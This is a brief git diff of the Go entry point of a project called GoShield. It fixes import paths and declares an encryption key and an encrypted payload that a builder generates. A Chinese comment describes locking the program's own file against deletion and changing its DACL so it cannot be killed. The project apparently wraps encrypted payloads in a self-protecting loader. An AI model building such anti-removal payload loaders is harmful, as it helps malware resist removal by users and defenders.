@@ -4,14 +4,15 @@ package main
 import (
 	"os"
 
-	"github.com/yourusername/GoShield/internal/crypto"
-	"github.com/yourusername/GoShield/internal/loader"
-	"github.com/yourusername/GoShield/internal/protect"
+	"github.com/Limkon/GoShield/internal/crypto"
+	"github.com/Limkon/GoShield/internal/loader"
+	"github.com/Limkon/GoShield/internal/protect"
 )
 
-// 声明外部变量，这些变量将在 Builder 动态生成的 payload.go 中定义
-extern var EncryptionKey []byte
-extern var EncryptedPayload []byte
+// 直接声明全局变量即可，不要用 extern
+// Builder 动态生成的 payload.go 也在 package main 下，它们会自动链接
+var EncryptionKey []byte
+var EncryptedPayload []byte
 
 func main() {
 	// 1. 启动最强防御：独占锁定自身防删，修改 DACL 防杀
